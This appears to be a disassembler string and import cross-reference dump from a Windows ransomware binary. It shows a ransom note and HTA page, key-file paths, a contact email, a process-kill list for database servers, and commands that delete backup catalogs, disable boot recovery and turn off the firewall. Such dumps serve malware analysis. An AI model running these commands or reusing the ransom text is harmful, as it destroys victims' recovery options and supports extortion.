reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4044e7	0x519a88	string	0x404440	" not used
0x404d9a	0x519abc	string	0x404cd0	InputBuffer
0x404e74	0x519abc	string	0x404cd0	InputBuffer
0x405149	0x4cb834	string	0x405140	j\fh0
0x405240	0x519ae0	string	0x4051f0	InputFileName
0x40526c	0x519b04	string	0x4051f0	InputBinaryMode
0x4052ae	0x4aa225	string	0x4051f0	;\r<1S
0x405362	0x519b24	string	0x405300	OutputFileNameWide
0x405381	0x519b38	string	0x405300	OutputBinaryMode
0x4053b7	0x4aa225	string	0x405300	;\r<1S
0x4054e2	0x519bd8	string	0x4054a0	CipherModeBase: feedback size cannot be specified for this cipher mode
0x405794	0x519b9c	string	0x4056b0	DecodingLookupArray
0x405828	0x519b90	string	0x4056b0	Log2Base
0x405868	0x4aa225	string	0x4056b0	;\r<1S
0x405b50	0x519b78	string	0x405a70	Uppercase
0x405b87	0x519b84	string	0x405a70	GroupSize
0x405bd6	0x519b60	string	0x405a70	Separator
0x405c1c	0x519b6c	string	0x405a70	Terminator
0x405d71	0x519c24	string	0x405d40	/GCM
0x4060f6	0x519b4c	string	0x4060f0	EncodingParameters
0x40644d	0x519bb0	string	0x406370	InsertLineBreaks
0x406484	0x519bc4	string	0x406370	MaxLineLength
0x406c96	0x4aa225	string	0x406c40	;\r<1S
0x406d5c	0x4aa225	string	0x406cb0	;\r<1S
0x406f26	0x519798	string	0x406e80	Unknown exception
0x407024	0x519798	string	0x406fc0	Unknown exception
0x407213	0x519c50	string	0x407090	", "
0x40722a	0x519c50	string	0x407090	", "
0x407303	0x4aa225	string	0x407090	;\r<1S
0x40763a	0x406520	string	0x4075f0	VWh@
0x4076cd	0x406520	string	0x407680	VWh@
0x4076d2	0x519c5c	string	0x407680	copy_file
0x407769	0x519c68	string	0x407720	exists
0x4077ff	0x519ca0	string	0x4077b0	copy
0x407946	0x4aa225	string	0x4078d0	;\r<1S
0x407968	0x4aa225	string	0x4078d0	;\r<1S
0x407987	0x4aa225	string	0x4078d0	;\r<1S
0x4079cb	0x4aa225	string	0x4078d0	;\r<1S
0x4079f3	0x4aa225	string	0x4078d0	;\r<1S
0x407ed7	0x4aa225	string	0x407e20	;\r<1S
0x407f43	0x4aa225	string	0x407f00	;\r<1S
0x407fce	0x4aa225	string	0x407f60	;\r<1S
0x4085b0	0x406520	string	0x407ff0	VWh@
0x40862b	0x4aa225	string	0x407ff0	;\r<1S
0x408858	0x4aa225	string	0x408670	;\r<1S
0x4088e9	0x519ca8	string	0x408890	C:\Windows
0x408904	0x519cc0	string	0x408890	C:\\Windows\
0x408ea0	0x519af0	string	0x408890	InputFileNameWide
0x408ed6	0x519b04	string	0x408890	InputBinaryMode
0x40903b	0x519cf0	string	0x408890	
0x40973f	0x519d28	string	0x408890	Unhandled exception caught
0x4098a5	0x4aa225	string	0x408890	;\r<1S
0x40a159	0x519cf0	string	0x409fb0	
0x40abd5	0x519d28	string	0x409fb0	Unhandled exception caught
0x40ad3e	0x4aa225	string	0x409fb0	;\r<1S
0x40ae1f	0x4f8124	import	0x40ad90	KERNEL32.dll.FindFirstFileW
0x40ae30	0x519d58	string	0x40ad90	fuck
0x40b2b2	0x519d78	string	0x40ad90	IDk.txt
0x40b2c9	0x519d88	string	0x40ad90	Decryption-Guide.txt
0x40b2e0	0x519db4	string	0x40ad90	Decryption-Guide.HTA
0x40b34d	0x519ca8	string	0x40ad90	C:\Windows
0x40b360	0x519cc0	string	0x40ad90	C:\\Windows\
0x40b373	0x519de0	string	0x40ad90	RSAKEY
0x40b5a0	0x4f8150	import	0x40ad90	KERNEL32.dll.lstrcmpW
0x40b5cb	0x519ca8	string	0x40ad90	C:\Windows
0x40b612	0x4f812c	import	0x40ad90	KERNEL32.dll.FindNextFileW
0x40b626	0x4f8138	import	0x40ad90	KERNEL32.dll.FindClose
0x40b8bd	0x4aa225	string	0x40ad90	;\r<1S
0x40b9ad	0x4f8124	import	0x40b920	KERNEL32.dll.FindFirstFileW
0x40b9c0	0x519d58	string	0x40b920	fuck
0x40be8a	0x519ca8	string	0x40b920	C:\Windows
0x40be9d	0x519cc0	string	0x40b920	C:\\Windows\
0x40c0cc	0x519dfc	string	0x40b920	threaad
0x40c0fa	0x519dfc	string	0x40b920	threaad
0x40c129	0x4f8150	import	0x40b920	KERNEL32.dll.lstrcmpW
0x40c154	0x519ca8	string	0x40b920	C:\Windows
0x40c196	0x4f812c	import	0x40b920	KERNEL32.dll.FindNextFileW
0x40c1a5	0x4f8138	import	0x40b920	KERNEL32.dll.FindClose
0x40c43c	0x4aa225	string	0x40b920	;\r<1S
0x40c52f	0x4f8124	import	0x40c4a0	KERNEL32.dll.FindFirstFileW
0x40c540	0x519d58	string	0x40c4a0	fuck
0x40ca04	0x519ca8	string	0x40c4a0	C:\Windows
0x40ca17	0x519cc0	string	0x40c4a0	C:\\Windows\
0x40cc44	0x4f8150	import	0x40c4a0	KERNEL32.dll.lstrcmpW
0x40cc6f	0x519ca8	string	0x40c4a0	C:\Windows
0x40ccb6	0x4f812c	import	0x40c4a0	KERNEL32.dll.FindNextFileW
0x40ccca	0x4f8138	import	0x40c4a0	KERNEL32.dll.FindClose
0x40cf61	0x4aa225	string	0x40c4a0	;\r<1S
0x40d04f	0x4f8124	import	0x40cfc0	KERNEL32.dll.FindFirstFileW
0x40d060	0x519d58	string	0x40cfc0	fuck
0x40d524	0x519ca8	string	0x40cfc0	C:\Windows
0x40d537	0x519cc0	string	0x40cfc0	C:\\Windows\
0x40d6a3	0x4f8150	import	0x40cfc0	KERNEL32.dll.lstrcmpW
0x40d6ce	0x519ca8	string	0x40cfc0	C:\Windows
0x40d715	0x4f812c	import	0x40cfc0	KERNEL32.dll.FindNextFileW
0x40d729	0x4f8138	import	0x40cfc0	KERNEL32.dll.FindClose
0x40d9c0	0x4aa225	string	0x40cfc0	;\r<1S
0x40da9f	0x4f8124	import	0x40da10	KERNEL32.dll.FindFirstFileW
0x40dab0	0x519d58	string	0x40da10	fuck
0x40df74	0x519ca8	string	0x40da10	C:\Windows
0x40df87	0x519cc0	string	0x40da10	C:\\Windows\
0x40e0f3	0x4f8150	import	0x40da10	KERNEL32.dll.lstrcmpW
0x40e11e	0x519ca8	string	0x40da10	C:\Windows
0x40e165	0x4f812c	import	0x40da10	KERNEL32.dll.FindNextFileW
0x40e179	0x4f8138	import	0x40da10	KERNEL32.dll.FindClose
0x40e410	0x4aa225	string	0x40da10	;\r<1S
0x40e4ef	0x4f8124	import	0x40e460	KERNEL32.dll.FindFirstFileW
0x40e500	0x519d58	string	0x40e460	fuck
0x40e8ba	0x519ca8	string	0x40e460	C:\Windows
0x40e923	0x519cc0	string	0x40e460	C:\\Windows\
0x40eb3f	0x4f8150	import	0x40e460	KERNEL32.dll.lstrcmpW
0x40eb6a	0x519ca8	string	0x40e460	C:\Windows
0x40ebb1	0x4f812c	import	0x40e460	KERNEL32.dll.FindNextFileW
0x40ebc5	0x4f8138	import	0x40e460	KERNEL32.dll.FindClose
0x40eccb	0x40ece1	string	0x40e460	QV螻\t blocks=Basic Latin,CJK Unified Ideographs
0x40eddf	0x40edf5	string	0x40e460	RQ芺\t blocks=Basic Latin,CJK Unified Ideographs
0x40ee5c	0x4aa225	string	0x40e460	;\r<1S
0x40ef4f	0x4f8124	import	0x40eec0	KERNEL32.dll.FindFirstFileW
0x40ef60	0x519d58	string	0x40eec0	fuck
0x40f0e4	0x40f0fa	string	0x40eec0	RQ腷\t blocks=Basic Latin,CJK Unified Ideographs
0x40f2cb	0x40f2e1	string	0x40eec0	RQ螵\t blocks=Basic Latin,CJK Unified Ideographs
0x40f424	0x519ca8	string	0x40eec0	C:\Windows
0x40f437	0x519cc0	string	0x40eec0	C:\\Windows\
0x40f653	0x4f8150	import	0x40eec0	KERNEL32.dll.lstrcmpW
0x40f67e	0x519ca8	string	0x40eec0	C:\Windows
0x40f6c5	0x4f812c	import	0x40eec0	KERNEL32.dll.FindNextFileW
0x40f6d9	0x4f8138	import	0x40eec0	KERNEL32.dll.FindClose
0x40f7df	0x40f7f5	string	0x40eec0	QV芰\t blocks=Basic Latin,CJK Unified Ideographs
0x40f970	0x4aa225	string	0x40eec0	;\r<1S
0x40fa5f	0x4f8124	import	0x40f9d0	KERNEL32.dll.FindFirstFileW
0x40fa70	0x519d58	string	0x40f9d0	fuck
0x40fddb	0x40fdf1	string	0x40f9d0	RQ莪\t blocks=Basic Latin,CJK Unified Ideographs
0x40ff27	0x519ca8	string	0x40f9d0	C:\Windows
0x40ff3a	0x519cc0	string	0x40f9d0	C:\\Windows\
0x410156	0x4f8150	import	0x40f9d0	KERNEL32.dll.lstrcmpW
0x410181	0x519ca8	string	0x40f9d0	C:\Windows
0x4101c8	0x4f812c	import	0x40f9d0	KERNEL32.dll.FindNextFileW
0x4101dc	0x4f8138	import	0x40f9d0	KERNEL32.dll.FindClose
0x4102e2	0x4102f8	string	0x40f9d0	QV臥\t blocks=Basic Latin,CJK Unified Ideographs
0x410473	0x4aa225	string	0x40f9d0	;\r<1S
0x41051d	0x4f8120	import	0x4104d0	KERNEL32.dll.GetLogicalDrives
0x4105e9	0x4aa50b	string	0x4104d0	j\fhp
0x410603	0x4aa225	string	0x4104d0	;\r<1S
0x410660	0x519e04	string	0x410630	sqlserver.exe
0x41069a	0x519e14	string	0x410630	msftesql.exe
0x4106cb	0x519e24	string	0x410630	sqlagent.exe
0x4106fc	0x519e34	string	0x410630	sqlbrowser.exe
0x41072d	0x519e44	string	0x410630	sqlwriter.exe
0x410755	0x519e54	string	0x410630	mysqld.exe
0x41077a	0x519e60	string	0x410630	mysqld-nt.exe
0x41079f	0x519e70	string	0x410630	mysqld-opt.exe
0x4107dc	0x4f8148	import	0x410630	KERNEL32.dll.CloseHandle
0x4107f4	0x4f8140	import	0x410630	KERNEL32.dll.CreateToolhelp32Snapshot
0x41080e	0x4f8128	import	0x410630	KERNEL32.dll.Process32First
0x41085a	0x4f813c	import	0x410630	KERNEL32.dll.OpenProcess
0x410869	0x4f8130	import	0x410630	KERNEL32.dll.TerminateProcess
0x410870	0x4f8148	import	0x410630	KERNEL32.dll.CloseHandle
0x41087a	0x4f8148	import	0x410630	KERNEL32.dll.CloseHandle
0x410888	0x4f8144	import	0x410630	KERNEL32.dll.Process32Next
0x4108bc	0x4aa50b	string	0x410630	j\fhp
0x4108d4	0x4aa225	string	0x410630	;\r<1S
0x410966	0x4f8124	import	0x4108e0	KERNEL32.dll.FindFirstFileW
0x410b9a	0x4f8150	import	0x4108e0	KERNEL32.dll.lstrcmpW
0x410bcc	0x519e8c	string	0x4108e0	\Decryption-Guide.txt
0x410da7	0x4f812c	import	0x4108e0	KERNEL32.dll.FindNextFileW
0x410dc1	0x4f8138	import	0x4108e0	KERNEL32.dll.FindClose
0x410ec4	0x410eda	string	0x4108e0	QV襙\t blocks=Basic Latin,CJK Unified Ideographs
0x410fe0	0x410ff6	string	0x4108e0	RQ艘\t blocks=Basic Latin,CJK Unified Ideographs
0x41105d	0x4aa225	string	0x4108e0	;\r<1S
0x411126	0x4f8124	import	0x4110a0	KERNEL32.dll.FindFirstFileW
0x4112c4	0x4112da	string	0x4110a0	RQ襕\t blocks=Basic Latin,CJK Unified Ideographs
0x41135a	0x4f8150	import	0x4110a0	KERNEL32.dll.lstrcmpW
0x411567	0x4f812c	import	0x4110a0	KERNEL32.dll.FindNextFileW
0x411581	0x4f8138	import	0x4110a0	KERNEL32.dll.FindClose
0x41181d	0x4aa225	string	0x4110a0	;\r<1S
0x4118fa	0x519f10	string	0x4118c0	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x4119d6	0x4aa225	string	0x4118c0	;\r<1S
0x411ab9	0x519f6c	string	0x4119f0	C:\ProgramData\IDk.txt
0x411afd	0x519f84	string	0x4119f0	C:\ProgramData\pkey.txt
0x411be4	0x411bfa	string	0x4119f0	RQ腌\t blocks=Basic Latin,CJK Unified Ideographs
0x411cd6	0x519f84	string	0x4119f0	C:\ProgramData\pkey.txt
0x411e43	0x519f6c	string	0x4119f0	C:\ProgramData\IDk.txt
0x411f49	0x519f9c	string	0x4119f0	C:\ProgramData
0x411fb0	0x411fc6	string	0x4119f0	RQ蹈\t blocks=Basic Latin,CJK Unified Ideographs
0x411fdd	0x519f9c	string	0x4119f0	C:\ProgramData
0x41206f	0x519ee8	string	0x4119f0	0123456789
0x4121a4	0x519ef4	string	0x4119f0	QWERTYUIOPASDFGHJKLZXCVBNM
0x412529	0x519f6c	string	0x4119f0	C:\ProgramData\IDk.txt
0x412956	0x519f84	string	0x4119f0	C:\ProgramData\pkey.txt
0x412985	0x519b14	string	0x4119f0	OutputFileName
0x4129a7	0x519b38	string	0x4119f0	OutputBinaryMode
0x412a4f	0x519fb0	string	0x4119f0	95DE4925807931C8D34E1D9460A2DE
0x412a76	0x519fd0	string	0x4119f0	B56BFF3C6B2E0F4E9F1DAE9E473CB39B6EE513DDC656B7B925468DE9FBCC1AB57E148DDE1009F8B7529A4E84850D7ECF43637A2D898EAEA3579544028F90370C65820B44A2C0B842A5D993F34FA8C549E9B20932D8BE55992CE50C95510FDD95734C8FFF874E771D33225664466F6E226FAF33FE35714A61E147AF2F17CF81015EEFBE8274C2672480956E3D44D54675E7725C53E334CBD146FA0B9B1F239898BDC3E5566E0DCB0E5FAEE35B685C0EEA7885CAE76DAA4A467E168C2AD1B1D32D883203A8F3A5FEA70903CC6F49067F099D2CAEED344F339E3BF1512BFC566CD2B3D68FC69A12BBFC565067CD777B65F7D9DA0A246CF4DA8C9362B55E9184658243C060381312A10A356D2039CA76CBC6BD1679E983ED653567CB8DBD7DC2FAF4F4F539EE41C6DB9B53C04F0F90CDA65FB3378739A75E016753EBA8FB838E8EE2AFC92FDB1CC3C4C94B88CFADC42BC1D781787661EEADA813C4A8802AD3211E04A39DEFA683CEEC8CFA9195936BCF66B3D42729A1E7E61AB4C521E2232365217743381CFD4B58FEE404639320574FA8C46580291B5412259D2CEEADF947D4DA5AD5EE3D149B2F80D969525DD8E8E1FA3983C9930577534CF1A00A264A482C709A1278BD1EB24AB328
0x412c85	0x51a364	string	0x4119f0	https://api.my-ip.io/ip
0x412d4c	0x51a37c	string	0x4119f0	%d-%m-%Y %H:%M:%S
0x412db9	0x51a390	string	0x4119f0	C:\ProgramData\prvkey.txt
0x412eac	0x51a3d0	string	0x4119f0	\n\nID=
0x412ece	0x51a3c4	string	0x4119f0	Disksize=
0x412fcf	0x51a3bc	string	0x4119f0	Mail=
0x41308e	0x51a3b4	string	0x4119f0	Ip=
0x41314a	0x51a3ac	string	0x4119f0	Date:
0x4136a8	0x51a390	string	0x4119f0	C:\ProgramData\prvkey.txt
0x413b5a	0x519cf0	string	0x4119f0	
0x413e9f	0x51a4d4	string	0x4119f0	RSAKEY-
0x413ee0	0x4f8134	import	0x4119f0	KERNEL32.dll.GetDriveTypeA
0x413f94	0x51a4e8	string	0x4119f0	.key
0x4140c2	0x51a4f8	string	0x4119f0	fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
0x4142c3	0x4aa50b	string	0x4119f0	j\fhp
0x4142fa	0x4aa225	string	0x4119f0	;\r<1S
0x41491a	0x4f814c	import	0x4147e0	KERNEL32.dll.FreeConsole
0x4149ba	0x519fb0	string	0x4147e0	95DE4925807931C8D34E1D9460A2DE
0x4149df	0x51a5f4	string	0x4147e0	Encrpt@criptext.com
0x414a07	0x51a5f4	string	0x4147e0	Encrpt@criptext.com
0x414e11	0x51a610	string	0x4147e0	012600EB82A86ECB8099E3272F0E692BA2F2D95A0D3C878D97C81EDA2AC2639598E70889BA6723CFAD748D08A71B4022D5E4873787273EC8498DA7E2158B38B751E3D1E2D29CA840E02EB75F5A80F7572223F6583205CDB8
0x414e41	0x51a610	string	0x4147e0	012600EB82A86ECB8099E3272F0E692BA2F2D95A0D3C878D97C81EDA2AC2639598E70889BA6723CFAD748D08A71B4022D5E4873787273EC8498DA7E2158B38B751E3D1E2D29CA840E02EB75F5A80F7572223F6583205CDB8
0x41525e	0x51a6c4	string	0x4147e0	.encrpt
0x4152f1	0x51a6cc	string	0x4147e0	net stop MSDTC
0x4152fb	0x51a6dc	string	0x4147e0	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x415305	0x51a718	string	0x4147e0	bcdedit /set {default} recoveryenabled no
0x41530f	0x51a744	string	0x4147e0	wbadmin delete catalog -quiet
0x415319	0x51a764	string	0x4147e0	net stop SQLSERVERAGENT
0x415323	0x51a77c	string	0x4147e0	net stop MSSQLSERVER
0x41532d	0x51a794	string	0x4147e0	net stop vds
0x415337	0x51a7a4	string	0x4147e0	netsh advfirewall set currentprofile state off
0x415341	0x51a7d4	string	0x4147e0	netsh firewall set opmode mode=disable
0x41534b	0x51a7fc	string	0x4147e0	net stop SQLWriter
0x415355	0x51a810	string	0x4147e0	net stop SQLBrowser
0x41535f	0x51a77c	string	0x4147e0	net stop MSSQLSERVER
0x415369	0x51a824	string	0x4147e0	net stop MSSQL$CONTOSO1
0x4153d5	0x4f8134	import	0x4147e0	KERNEL32.dll.GetDriveTypeA
0x415586	0x4aab80	string	0x4147e0	WVS3
0x415594	0x4aab80	string	0x4147e0	WVS3
0x415787	0x51a898	string	0x4147e0	Your Files Are Has Been Locked\n\nYour Files Has Been Encrypted with cryptography Algorithm\n\nIf You Need Your Files And They are Important to You, Dont be shy Send Me an Email\n\nSend Test File + The Key File on Your System (File Exist in C:/ProgramData example : RSAKEY-SE-24r6t523 pr RSAKEY.KEY) to Make Sure Your Files Can be Restored\n\nMake an Agreement on Price with me and Pay\n\n\n\nGet Decryption Tool + RSA Key AND Instruction For Decryption Process\n\n\n\nAttention:\n\n1- Do Not Rename or Modify The Files (You May loose That file)\n\n2- Do Not Try To Use 3rd Party Apps or Recovery Tools ( if You want to do that make an copy from Files and try on them and Waste Your time )\n\n3-Do not Reinstall Operation System(Windows) You may loose the key File and Loose Your Files\n\n4-Do Not Always Trust to Middle mans and negotiators (some of them are good but some of them agree on 4000usd for example and Asked 10000usd From Client) this Was happened\n\n\n\nYour Case ID :
0x41579c	0x51a870	string	0x4147e0	\n\nOUR Email :
0x41583c	0x51a83c	string	0x4147e0	\n\n in Case of no answer:
0x415a75	0x51b0a8	string	0x4147e0	<!DOCTYPE html>\n<html lang='en'>\n<head>\n <meta http-equiv='X-UA-Compatible' content='IE=9' /> <script type='text/javascript'> window.resizeTo(window.screen.width,window.screen.height);</script> <meta charset='UTF - 8'>\n <title>Your Files Are Locked</title>\n <meta http-equiv='x - ua - compatible' content='IE = 9'/>\n <style>\n body { \n background-image: url('https://thumbor.forbes.com/thumbor/711x399/https://specials-images.forbesimg.com/imageserve/60b123d8f2894ada36d1fb5b/Lock---abstract-glitch-background/960x0.jpg');\n background-size: cover; \n font-size: 15pt;\n font-weight:bolder ;\n text-align: center;\n margin: auto;\n \n\n } #div1 {\n margin: auto;\n margin-top:50px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\n color: white;\n color: wheat;\n \n\n } #div2 {\n margin: auto;\n margin-top: 40px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\ncolor: wheat;\n } \n\n #div3{ \n color: white;\n margin: auto;\n margin-top:40px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\n } \n\n </style>\n</head>\n<body>\n<div id='div0'>\n<div id='div1'>\n Your Files Are Has Been Locked\n <br>\n Your Files Has Been Encrypted with cryptography Algorithm\n <br>\n If You Need Your Files And They are Important to You, Dont be shy Send Me an Email\n <br>\n Send Test File + The Key File on Your System (File Exist in C:/ProgramData example : KEY-SE-24r6t523 or RSAKEY.KEY) to Make Sure Your Fi
0x415a84	0x51b060	string	0x4147e0	\n <br>\n Our Email:
0x415b30	0x51b010	string	0x4147e0	\n </div> \n </div>\n</body>\n</html>
0x415d21	0x4f8134	import	0x4147e0	KERNEL32.dll.GetDriveTypeA
0x416113	0x519e8c	string	0x4147e0	\Decryption-Guide.txt
0x4163f5	0x4f8134	import	0x4147e0	KERNEL32.dll.GetDriveTypeA
0x4165ae	0x519d28	string	0x4147e0	Unhandled exception caught
0x416753	0x4aa225	string	0x4147e0	;\r<1S
0x41679a	0x519d28	string	0x4147e0	Unhandled exception caught
0x416e37	0x416e42	string	0x416dc0	3ɉN`Ɔ blocks=Basic Latin,Latin Extended-B
0x417748	0x417759	string	0x417700	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41774e	0x417759	string	0x417700	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41780b	0x519ac8	string	0x417800	SHA-1
0x417997	0x51c650	string	0x417960	OutputStringPointer
0x418667	0x418679	string	0x4185b0	3ۋE\b blocks=Basic Latin,Arabic
0x41868c	0x4186d3	string	0x4185b0	VS膖\n blocks=Basic Latin,CJK Unified Ideographs
0x418d23	0x418d27	string	0x418d00	WPRQ
0x418e36	0x4aa225	string	0x418d60	;\r<1S
0x418f3f	0x4aa225	string	0x418e50	;\r<1S
0x41934a	0x4ce8da	string	0x419120	j\fhP\aS
0x4193a4	0x4aa225	string	0x419120	;\r<1S
0x41945f	0x4cbadc	string	0x419400	j\fhP
0x4194fa	0x4aa225	string	0x4194d0	;\r<1S
0x419538	0x4aa225	string	0x4194d0	;\r<1S
0x419578	0x4cb834	string	0x4194d0	j\fh0
0x41959b	0x4aa225	string	0x4194d0	;\r<1S
0x41962e	0x4aa225	string	0x4194d0	;\r<1S
0x419852	0x419887	string	0x419770	;O\fs
0x419a0b	0x4aa225	string	0x419770	;\r<1S
0x41a1b4	0x4aa225	string	0x41a0e0	;\r<1S
0x41a2cc	0x4aa225	string	0x41a1c0	;\r<1S
0x41a86a	0x4ce8da	string	0x41a660	j\fhP\aS
0x41a8b5	0x4aa225	string	0x41a660	;\r<1S
0x41a968	0x4ce8da	string	0x41a910	j\fhP\aS
0x41a9e5	0x4aa225	string	0x41a9c0	;\r<1S
0x41aa21	0x4aa225	string	0x41a9c0	;\r<1S
0x41aa7c	0x4aa225	string	0x41a9c0	;\r<1S
0x41aadb	0x4aa225	string	0x41a9c0	;\r<1S
0x41ab1e	0x4aa225	string	0x41a9c0	;\r<1S
0x41afe4	0x41afef	string	0x41af90	3ɉN` blocks=Basic Latin,Latin Extended-B
0x41bbca	0x41bbdb	string	0x41bba0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41bbd0	0x41bbdb	string	0x41bba0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41bf0c	0x4aa225	string	0x41beb0	;\r<1S
0x41c0a6	0x4aa225	string	0x41bf20	;\r<1S
0x41c246	0x4aa225	string	0x41c0c0	;\r<1S
0x41c2d0	0x4aa225	string	0x41c260	;\r<1S
0x41c350	0x4aa225	string	0x41c2e0	;\r<1S
0x41c3cd	0x4aa225	string	0x41c360	;\r<1S
0x41c44d	0x4aa225	string	0x41c3e0	;\r<1S
0x41c644	0x4aa225	string	0x41c460	;\r<1S
0x41c8d3	0x51c6f4	string	0x41c8a0	BufferedTransformation: this object doesn't allow input
0x41ca33	0x51c6f4	string	0x41ca00	BufferedTransformation: this object doesn't allow input
0x41d27e	0x4aa225	string	0x41d210	;\r<1S
0x41d2b6	0x4aa225	string	0x41d210	;\r<1S
0x41d2c8	0x4aa225	string	0x41d210	;\r<1S
0x41d992	0x4aa225	string	0x41d930	;\r<1S
0x41d9ca	0x4aa225	string	0x41d930	;\r<1S
0x41d9dc	0x4aa225	string	0x41d930	;\r<1S
0x41dad6	0x4aa225	string	0x41d9f0	;\r<1S
0x41e000	0x51c72c	string	0x41e000	vector<T> too long
0x41e5df	0x4aa225	string	0x41e1d0	;\r<1S
0x41eaef	0x4aa225	string	0x41e690	;\r<1S
0x41ec1d	0x519c34	string	0x41ebd0	MGF1
0x41eca2	0x519ac8	string	0x41ebd0	SHA-1
0x41eec0	0x51c798	string	0x41eec0	invalid string position
0x41ef8a	0x4aa225	string	0x41eed0	;\r<1S
0x41f5d1	0x4aa225	string	0x41f460	;\r<1S
0x41f648	0x51a4f0	string	0x41f5e0	RSAKEY-
0x41f97e	0x4aa225	string	0x41f8b0	;\r<1S
0x41fa8f	0x4aa225	string	0x41f990	;\r<1S
0x41fb9f	0x4aa225	string	0x41faa0	;\r<1S
0x41fc0b	0x519ad0	string	0x41fbd0	FeedbackSize
0x41fc30	0x4aa225	string	0x41fbd0	;\r<1S
0x41fd40	0x4aa225	string	0x41fc40	;\r<1S
0x41fe0f	0x41fe18	string	0x41fd50	j4輦\b blocks=Basic Latin,CJK Unified Ideographs
0x41fec8	0x4aa225	string	0x41fd50	;\r<1S
0x420198	0x4aa225	string	0x4200d0	;\r<1S
0x4203a8	0x4aa225	string	0x4201f0	;\r<1S
0x4206d1	0x519df0	string	0x420560	shit
0x420ccd	0x4aa225	string	0x420c20	;\r<1S
0x421054	0x4aa225	string	0x420ec0	;\r<1S
0x42123e	0x4aa225	string	0x4210b0	;\r<1S
0x421490	0x4aa225	string	0x4213d0	;\r<1S
0x421e13	0x4aa225	string	0x421cd0	;\r<1S
0x421fb2	0x4aa225	string	0x421e20	;\r<1S
0x4220d8	0x4220ec	string	0x421fc0	QS蓇\b blocks=Basic Latin,CJK Unified Ideographs
0x422805	0x4aa225	string	0x422660	;\r<1S
